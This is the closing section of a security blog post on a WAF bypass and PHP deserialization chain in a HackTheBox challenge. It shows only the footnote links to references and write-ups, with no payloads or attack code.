      <p><a href="https://www.php.net/manual/en/language.oop5.decon.php#object.construct">https://www.php.net/manual/en/language.oop5.decon.php#object.construct</a>Â <a href="#fnref:construct" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:wakeup">
      <p><a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup</a>Â <a href="#fnref:wakeup" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:complex">
      <p><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex</a>Â <a href="#fnref:complex" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:writeup">
      <p><a href="https://github.com/MegadodoPublications/exploits/blob/master/composr.md">https://github.com/MegadodoPublications/exploits/blob/master/composr.md</a>Â <a href="#fnref:writeup" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:Spl">
      <p><a href="https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works">https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works</a>Â <a href="#fnref:Spl" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:oast">
      <p><a href="https://portswigger.net/burp/application-security-testing/oast">https://portswigger.net/burp/application-security-testing/oast</a>Â <a href="#fnref:oast" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:param-ent">
      <p><a href="https://www.w3resource.com/xml/parameter-entities.php">https://www.w3resource.com/xml/parameter-entities.php</a>Â <a href="#fnref:param-ent" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:obf1">
      <p><a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings">https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings</a>Â <a href="#fnref:obf1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:obf2">
      <p><a href="https://github.com/Ambrotd/XXE-Notes">https://github.com/Ambrotd/XXE-Notes</a>Â <a href="#fnref:obf2" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:ssc">
      <p><a href="https://sys3cybersecurity.netlify.app/htb-waffle-y-order/">https://sys3cybersecurity.netlify.app/htb-waffle-y-order/</a>Â <a href="#fnref:ssc" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
  </ol>
</div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
          <a href="/categories/web-hacking/">Web Hacking</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/hackthebox/"
            class="post-tag no-text-decoration"
          >hackthebox</a>
        
          <a
            href="/tags/php/"
            class="post-tag no-text-decoration"
          >PHP</a>
        
          <a
            href="/tags/deserialization/"
            class="post-tag no-text-decoration"
          >deserialization</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=WAF%20bypass%20and%20vulnerability%20chain%20exploiting%20parser%20differentials%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fwaf-bypass-exploiting-parser-differentials%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=WAF%20bypass%20and%20vulnerability%20chain%20exploiting%20parser%20differentials%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fwaf-bypass-exploiting-parser-differentials%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fwaf-bypass-exploiting-parser-differentials%2F&text=WAF%20bypass%20and%20vulnerability%20chain%20exploiting%20parser%20differentials%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fwaf-bypass-exploiting-parser-differentials%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fwaf-bypass-exploiting-parser-differentials%2F&title=WAF%20bypass%20and%20vulnerability%20chain%20exploiting%20parser%20differentials%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/bypassing-addslashes-using-format-string-to-get-sql-injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1632780000"
  data-df="ll"
  
>
  Sep 28, 2021
</time>

              <h4 class="pt-0 my-2">Bypassing addslashes() using format string to get SQL Injection</h4>
              <div class="text-muted">
                <p>Learn how to bypass the addslashes() function using format strings and get SQL Injection in this HackTheBox challange called baby sql.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/pickle-insecure-deserialization/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1630447200"
  data-df="ll"
  
>
  Sep  1, 2021
</time>

              <h4 class="pt-0 my-2">Pickle Insecure Deserialization</h4>
              <div class="text-muted">
                <p>Learn how to exploit Pickle Insecure Deserialization! HackTheBox &quot;baby website rick&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/admirertoo/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679954400"
  data-df="ll"
  
>
  Mar 28, 2023
</time>

              <h4 class="pt-0 my-2">HackTheBox - AdmirerToo</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;AdmirerToo&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/ssti-in-ejs-app-using-undocumented-features/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Finding SSTI in an EJS app using existing exploits and undocumented features</p>
    </a>
  

  
    <a
      href="/posts/android-pentesting-lab/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>How to set up an Android Penetration Testing Lab from scratch</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>Â©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by â˜•, ğŸ›ğŸœğŸ, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

